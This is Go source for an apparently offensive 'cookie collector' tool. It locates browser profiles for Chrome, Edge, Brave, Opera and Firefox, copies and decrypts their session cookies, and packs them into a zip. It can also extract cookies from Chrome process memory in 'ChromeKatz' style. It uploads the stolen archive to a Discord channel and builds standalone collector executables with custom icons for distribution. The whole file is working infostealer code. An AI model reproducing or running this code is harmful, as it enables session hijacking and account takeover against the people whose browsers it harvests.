package cookies

import (
	"archive/zip"
	"bufio"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"programa/utils"
	"runtime"

	"github.com/bwmarrin/discordgo"
	_ "modernc.org/sqlite"
)

type BrowserProfile struct {
	Browser     string
	ProfileName string
	CookiesPath string
	LocalState  string
	OutputName  string
}

type BrowserCookie struct {
	Host       string
	Name       string
	Value      string
	Path       string
	Expires    string
	Secure     bool
	HttpOnly   bool
	LastAccess string
}

func CookieToolMenu() {
	reader := bufio.NewReader(os.Stdin)

	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ COOKIE COLLECTOR ============%s\n\n", utils.Blue, utils.Reset)
		fmt.Printf("%s[1]  - Extract from disk (file-based)%s\n", utils.Green, utils.Reset)
		if runtime.GOOS == "windows" {
			fmt.Printf("%s[2]  - Extract from memory (process-based - ChromeKatz style)%s\n", utils.Green, utils.Reset)
			fmt.Printf("%s[3]  - List Chrome processes%s\n", utils.Green, utils.Reset)
			fmt.Printf("%s[4]  - Build cookie collector executable%s\n", utils.Green, utils.Reset)
			utils.PrintReturnOption("5")
		} else {
			fmt.Printf("%s[2]  - Build cookie collector executable%s\n", utils.Green, utils.Reset)
			utils.PrintReturnOption("3")
		}

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			runCookieCollection()
		case "2":
			if runtime.GOOS == "windows" {
				runMemoryExtraction()
			} else {
				buildCollectorExecutable()
			}
		case "3":
			if runtime.GOOS == "windows" {
				listChromeProcesses()
			} else {
				return
			}
		case "4":
			if runtime.GOOS == "windows" {
				buildCollectorExecutable()
			} else {
				return
			}
		case "5":
			if runtime.GOOS == "windows" {
				return
			}
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		}
	}
}

func runCookieCollection() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sEnter path for output ZIP file: %s", utils.Green, utils.Reset)
	zipPath, _ := reader.ReadString('\n')
	zipPath = strings.TrimSpace(zipPath)
	zipPath = normalizeZipPath(zipPath)

	total, outputFiles, err := collectCookies(zipPath)
	if err != nil {
		fmt.Printf("%s[!] Failed to collect cookies: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("%s[✓] Collected %d cookie entries%s\n", utils.Green, total, utils.Reset)
	fmt.Printf("%s[✓] Zip file created: %s%s\n", utils.Blue, zipPath, utils.Reset)
	fmt.Printf("%s[✓] Files inside zip:%s\n", utils.Blue, utils.Reset)
	for _, file := range outputFiles {
		fmt.Printf("  - %s\n", file)
	}

	fmt.Printf("\n%sSend this zip to Discord? (y/n): %s", utils.Yellow, utils.Reset)
	sendChoice, _ := reader.ReadString('\n')
	sendChoice = strings.TrimSpace(strings.ToLower(sendChoice))

	if sendChoice == "y" || sendChoice == "yes" {
		if err := sendZipToDiscord(zipPath); err != nil {
			fmt.Printf("%s[!] Discord upload failed: %v%s\n", utils.Red, err, utils.Reset)
		} else {
			fmt.Printf("%s[✓] Zip uploaded to Discord successfully%s\n", utils.Green, utils.Reset)
		}
	}

	fmt.Printf("\n%sPress Enter to return to menu...%s", utils.Green, utils.Reset)
	reader.ReadString('\n')
}

func normalizeZipPath(path string) string {
	if path == "" {
		return filepath.Join(os.TempDir(), fmt.Sprintf("cookies_dump_%s.zip", time.Now().Format("20060102_150405")))
	}

	if strings.HasSuffix(strings.ToLower(path), ".zip") {
		return path
	}

	info, err := os.Stat(path)
	if err == nil && info.IsDir() {
		return filepath.Join(path, fmt.Sprintf("cookies_dump_%s.zip", time.Now().Format("20060102_150405")))
	}

	if strings.HasSuffix(path, string(os.PathSeparator)) {
		return filepath.Join(path, fmt.Sprintf("cookies_dump_%s.zip", time.Now().Format("20060102_150405")))
	}

	return path + ".zip"
}

func collectCookies(zipPath string) (int, []string, error) {
	profiles, err := findBrowserProfiles()
	if err != nil {
		return 0, nil, err
	}

	if len(profiles) == 0 {
		return 0, nil, errors.New("no browser cookie profiles found")
	}

	files := make(map[string][]byte)
	total := 0

	for _, profile := range profiles {
		cookies, err := extractProfileCookies(profile)
		if err != nil {
			continue
		}
		if len(cookies) == 0 {
			continue
		}

		filename := utils.SanitizeForFilename(profile.OutputName)
		content := buildCookieText(cookies)
		files[filename] = content
		total += len(cookies)
	}

	if total == 0 {
		return 0, nil, errors.New("no cookies could be extracted")
	}

	if err := writeZip(zipPath, files); err != nil {
		return 0, nil, err
	}

	outputNames := make([]string, 0, len(files))
	for name := range files {
		outputNames = append(outputNames, name)
	}

	return total, outputNames, nil
}

func findBrowserProfiles() ([]BrowserProfile, error) {
	roots := map[string]string{}
	home, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}

	if runtime.GOOS == "windows" {
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		roots = map[string]string{
			"Chrome":   filepath.Join(local, "Google", "Chrome", "User Data"),
			"Edge":     filepath.Join(local, "Microsoft", "Edge", "User Data"),
			"Brave":    filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"),
			"Chromium": filepath.Join(local, "Chromium", "User Data"),
			"Opera":    filepath.Join(roaming, "Opera Software", "Opera Stable"),
			"Firefox":  filepath.Join(roaming, "Mozilla", "Firefox"),
		}
	} else {
		roots = map[string]string{
			"Chrome":   filepath.Join(home, ".config", "google-chrome"),
			"Edge":     filepath.Join(home, ".config", "microsoft-edge"),
			"Brave":    filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser"),
			"Chromium": filepath.Join(home, ".config", "chromium"),
			"Opera":    filepath.Join(home, ".config", "opera"),
			"Firefox":  filepath.Join(home, ".mozilla", "firefox"),
		}
	}

	var profiles []BrowserProfile

	for browser, root := range roots {
		if root == "" {
			continue
		}
		if _, err := os.Stat(root); err != nil {
			continue
		}

		if browser == "Firefox" {
			profiles = append(profiles, findFirefoxProfiles(root)...)
			continue
		}

		localState := filepath.Join(root, "Local State")
		if _, err := os.Stat(localState); err != nil {
			continue
		}

		entries, err := os.ReadDir(root)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}

			name := entry.Name()
			if name == "System Profile" || name == "Local State" {
				continue
			}

			cookiePath := filepath.Join(root, name, "Cookies")
			if _, err := os.Stat(cookiePath); err != nil {
				continue
			}

			profiles = append(profiles, BrowserProfile{
				Browser:     browser,
				ProfileName: name,
				CookiesPath: cookiePath,
				LocalState:  localState,
				OutputName:  fmt.Sprintf("%s_%s.txt", browser, name),
			})
		}
	}

	return profiles, nil
}

func extractProfileCookies(profile BrowserProfile) ([]BrowserCookie, error) {
	if profile.Browser == "Firefox" {
		return extractFirefoxCookies(profile.CookiesPath)
	}

	var key []byte
	var err error

	if runtime.GOOS == "windows" {
		key, err = extractChromeKeyWindowsFromDisk(profile.LocalState)
	} else {
		key, err = extractChromeKeyLinux()
	}

	if err != nil {
		return extractCookiesWithoutEncryption(profile.CookiesPath)
	}

	return extractCookiesWithKey(profile.CookiesPath, key)
}

func extractCookiesWithoutEncryption(cookiesPath string) ([]BrowserCookie, error) {
	tempDir, err := os.MkdirTemp("", "cookies_profile")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tempDir)

	tempCookies := filepath.Join(tempDir, "Cookies")
	if err := utils.CopyFile(cookiesPath, tempCookies); err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempCookies)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host_key, name, path, expires_utc, is_secure, is_httponly, last_access_utc, encrypted_value FROM cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []BrowserCookie
	for rows.Next() {
		var host, name, path string
		var expiresUTC int64
		var secure, httponly int
		var lastAccess int64
		var encrypted []byte

		if err := rows.Scan(&host, &name, &path, &expiresUTC, &secure, &httponly, &lastAccess, &encrypted); err != nil {
			continue
		}

		cookies = append(cookies, BrowserCookie{
			Host:       host,
			Name:       name,
			Value:      "[encrypted - key unavailable]",
			Path:       path,
			Expires:    convertWebkitTime(expiresUTC),
			Secure:     secure != 0,
			HttpOnly:   httponly != 0,
			LastAccess: convertWebkitTime(lastAccess),
		})
	}

	return cookies, nil
}

func convertWebkitTime(timestamp int64) string {
	if timestamp == 0 {
		return "0"
	}
	base := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	return base.Add(time.Duration(timestamp) * time.Microsecond).Format(time.RFC3339)
}

func buildCookieText(cookies []BrowserCookie) []byte {
	buf := &strings.Builder{}
	buf.WriteString("Host\tName\tValue\tPath\tExpires\tSecure\tHttpOnly\tLastAccess\n")
	for _, cookie := range cookies {
		buf.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%t\t%t\t%s\n",
			cookie.Host,
			cookie.Name,
			cookie.Value,
			cookie.Path,
			cookie.Expires,
			cookie.Secure,
			cookie.HttpOnly,
			cookie.LastAccess,
		))
	}
	return []byte(buf.String())
}

func writeZip(zipPath string, files map[string][]byte) error {
	if err := os.MkdirAll(filepath.Dir(zipPath), 0755); err != nil {
		return err
	}

	out, err := os.Create(zipPath)
	if err != nil {
		return err
	}
	defer out.Close()

	zw := zip.NewWriter(out)
	defer zw.Close()

	for name, data := range files {
		w, err := zw.Create(name)
		if err != nil {
			return err
		}
		if _, err := w.Write(data); err != nil {
			return err
		}
	}

	return nil
}

func sendZipToDiscord(zipPath string) error {
	token := strings.TrimSpace(os.Getenv("DISCORD_BOT_TOKEN"))
	channelID := strings.TrimSpace(os.Getenv("DISCORD_CHANNEL_ID"))

	reader := bufio.NewReader(os.Stdin)
	if token == "" {
		fmt.Print("Enter Discord bot token: ")
		tokenInput, _ := reader.ReadString('\n')
		token = strings.TrimSpace(tokenInput)
	}
	if channelID == "" {
		fmt.Print("Enter Discord channel ID: ")
		channelInput, _ := reader.ReadString('\n')
		channelID = strings.TrimSpace(channelInput)
	}
	if token == "" || channelID == "" {
		return errors.New("discord bot token and channel ID are required")
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return err
	}
	defer dg.Close()

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = dg.ChannelFileSend(channelID, filepath.Base(zipPath), file)
	return err
}

func buildCollectorExecutable() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sExecutable base name: %s", utils.Green, utils.Reset)
	name, _ := reader.ReadString('\n')
	name = strings.TrimSpace(name)
	if name == "" {
		name = "cookie_collector"
	}

	fmt.Printf("%sOutput directory: %s", utils.Green, utils.Reset)
	outputDir, _ := reader.ReadString('\n')
	outputDir = strings.TrimSpace(outputDir)
	if outputDir == "" {
		outputDir = "target"
	}

	fmt.Printf("%sIcon path (optional): %s", utils.Green, utils.Reset)
	iconPath, _ := reader.ReadString('\n')
	iconPath = strings.TrimSpace(iconPath)

	fmt.Printf("%sBuild target (windows/linux/both): %s", utils.Yellow, utils.Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(strings.ToLower(target))
	if target != "windows" && target != "linux" && target != "both" {
		target = "both"
	}

	if err := os.MkdirAll(outputDir, 0755); err != nil {
		fmt.Printf("%s[!] Failed to create output directory: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	buildTargets := []struct {
		GOOS string
		Ext  string
	}{
		{GOOS: "linux", Ext: ""},
	}
	if target == "windows" || target == "both" {
		buildTargets = append(buildTargets, struct{ GOOS, Ext string }{GOOS: "windows", Ext: ".exe"})
	}

	for _, t := range buildTargets {
		output := filepath.Join(outputDir, name+t.Ext)
		fmt.Printf("%sBuilding %s...%s\n", utils.Blue, output, utils.Reset)
		cmd := exec.Command("go", "build", "-o", output, "./scripts/cookies/collector")
		cmd.Env = append(os.Environ(), "GOOS="+t.GOOS, "GOARCH=amd64", "CGO_ENABLED=0")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("%s[!] Build failed for %s: %v%s\n", utils.Red, t.GOOS, err, utils.Reset)
			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
			return
		}
	}

	if iconPath != "" {
		iconDest := filepath.Join(outputDir, filepath.Base(iconPath))
		if err := utils.CopyFile(iconPath, iconDest); err == nil {
			fmt.Printf("%s[✓] Icon copied to %s%s\n", utils.Green, iconDest, utils.Reset)
		} else {
			fmt.Printf("%s[!] Icon copy failed: %v%s\n", utils.Yellow, err, utils.Reset)
		}
	}

	fmt.Printf("%s[✓] Build completed%s\n", utils.Green, utils.Reset)
	fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
	reader.ReadString('\n')
}

func RunCollectorCLI() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sEnter output zip path: %s", utils.Green, utils.Reset)
	zipPath, _ := reader.ReadString('\n')
	zipPath = strings.TrimSpace(zipPath)
	zipPath = normalizeZipPath(zipPath)

	total, _, err := collectCookies(zipPath)
	if err != nil {
		fmt.Printf("%sError collecting cookies: %v%s\n", utils.Red, err, utils.Reset)
		os.Exit(1)
	}

	fmt.Printf("%sCollected %d cookies.%s\n", utils.Green, total, utils.Reset)
	fmt.Printf("%sZip created: %s%s\n", utils.Blue, zipPath, utils.Reset)
}

func findFirefoxProfiles(firefoxRoot string) []BrowserProfile {
	var profiles []BrowserProfile

	entries, err := os.ReadDir(firefoxRoot)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		profilePath := filepath.Join(firefoxRoot, entry.Name())
		cookiePath := filepath.Join(profilePath, "cookies.sqlite")

		if _, err := os.Stat(cookiePath); err != nil {
			continue
		}

		profiles = append(profiles, BrowserProfile{
			Browser:     "Firefox",
			ProfileName: entry.Name(),
			CookiesPath: cookiePath,
			LocalState:  "",
			OutputName:  fmt.Sprintf("Firefox_%s.txt", entry.Name()),
		})
	}

	return profiles
}

func extractFirefoxCookies(cookiePath string) ([]BrowserCookie, error) {
	tempDir, err := os.MkdirTemp("", "firefox_cookies")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tempDir)

	tempCookies := filepath.Join(tempDir, "cookies.sqlite")
	if err := utils.CopyFile(cookiePath, tempCookies); err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempCookies)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []BrowserCookie
	for rows.Next() {
		var host, name, value, path string
		var expiry int64
		var secure, httponly int

		if err := rows.Scan(&host, &name, &value, &path, &expiry, &secure, &httponly); err != nil {
			continue
		}

		cookies = append(cookies, BrowserCookie{
			Host:       host,
			Name:       name,
			Value:      value,
			Path:       path,
			Expires:    convertUnixTime(expiry),
			Secure:     secure != 0,
			HttpOnly:   httponly != 0,
			LastAccess: "",
		})
	}

	return cookies, nil
}

func convertUnixTime(timestamp int64) string {
	if timestamp == 0 {
		return "0"
	}
	return time.Unix(timestamp, 0).Format(time.RFC3339)
}

func extractFirefoxPasswordsCookies(profilePath string) ([]BrowserCookie, error) {
	// Firefox stores cookies in cookies.sqlite but also has logins in key4.db
	// For now, focus on cookies which are unencrypted
	return extractFirefoxCookies(filepath.Join(profilePath, "cookies.sqlite"))
}

func runMemoryExtraction() {
	reader := bufio.NewReader(os.Stdin)

	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] Memory extraction only available on Windows%s\n", utils.Red, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("%sEnter path for output ZIP file: %s", utils.Green, utils.Reset)
	zipPath, _ := reader.ReadString('\n')
	zipPath = strings.TrimSpace(zipPath)
	zipPath = normalizeZipPath(zipPath)

	fmt.Printf("%s[*] Extracting cookies from Chrome process memory (ChromeKatz-style)...%s\n", utils.Blue, utils.Reset)

	cookies, err := ExtractCookiesFromMemory()
	if err != nil {
		fmt.Printf("%s[!] Memory extraction failed: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%s[*] Falling back to file-based extraction...%s\n", utils.Yellow, utils.Reset)

		total, outputFiles, err := collectCookies(zipPath)
		if err != nil {
			fmt.Printf("%s[!] Fallback failed: %v%s\n", utils.Red, err, utils.Reset)
			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
			return
		}

		fmt.Printf("%s[✓] Collected %d cookies (via file-based extraction)%s\n", utils.Green, total, utils.Reset)
		fmt.Printf("%s[✓] Zip file created: %s%s\n", utils.Blue, zipPath, utils.Reset)
		fmt.Printf("%s[✓] Files inside zip:%s\n", utils.Blue, utils.Reset)
		for _, file := range outputFiles {
			fmt.Printf("  - %s\n", file)
		}

		fmt.Printf("\n%sSend this zip to Discord? (y/n): %s", utils.Yellow, utils.Reset)
		sendChoice, _ := reader.ReadString('\n')
		sendChoice = strings.TrimSpace(strings.ToLower(sendChoice))
		if sendChoice == "y" || sendChoice == "yes" {
			if err := sendZipToDiscord(zipPath); err != nil {
				fmt.Printf("%s[!] Discord upload failed: %v%s\n", utils.Red, err, utils.Reset)
			} else {
				fmt.Printf("%s[✓] Zip uploaded to Discord successfully%s\n", utils.Green, utils.Reset)
			}
		}

		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	if len(cookies) == 0 {
		fmt.Printf("%s[!] No cookies found in process memory%s\n", utils.Red, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	// Create output file with memory-extracted cookies
	files := make(map[string][]byte)
	if err := os.MkdirAll(filepath.Dir(zipPath), 0755); err != nil {
		fmt.Printf("%s[!] Failed to create output directory: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	content := buildCookieText(cookies)
	files["Chrome_Memory_Extract.txt"] = content

	if err := writeZip(zipPath, files); err != nil {
		fmt.Printf("%s[!] Failed to create ZIP: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("%s[✓] Extracted %d cookies from memory%s\n", utils.Green, len(cookies), utils.Reset)
	fmt.Printf("%s[✓] Zip file created: %s%s\n", utils.Blue, zipPath, utils.Reset)

	fmt.Printf("\n%sSend this zip to Discord? (y/n): %s", utils.Yellow, utils.Reset)
	sendChoice, _ := reader.ReadString('\n')
	sendChoice = strings.TrimSpace(strings.ToLower(sendChoice))
	if sendChoice == "y" || sendChoice == "yes" {
		if err := sendZipToDiscord(zipPath); err != nil {
			fmt.Printf("%s[!] Discord upload failed: %v%s\n", utils.Red, err, utils.Reset)
		} else {
			fmt.Printf("%s[✓] Zip uploaded to Discord successfully%s\n", utils.Green, utils.Reset)
		}
	}

	fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
	reader.ReadString('\n')
}

func listChromeProcesses() {
	reader := bufio.NewReader(os.Stdin)

	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] Process listing only available on Windows%s\n", utils.Red, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("%s[*] Available Chrome/Edge processes:%s\n", utils.Blue, utils.Reset)

	processes, err := ListChromeProcesses()
	if err != nil {
		fmt.Printf("%s[!] Failed to enumerate processes: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	if len(processes) == 0 {
		fmt.Printf("%s[!] No Chrome/Edge processes found%s\n", utils.Yellow, utils.Reset)
		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
		reader.ReadString('\n')
		return
	}

	for i, proc := range processes {
		fmt.Printf("%s[%d]%s PID: %d - %v\n", utils.Green, i+1, utils.Reset, proc["pid"], proc["name"])
	}

	fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
	reader.ReadString('\n')
}
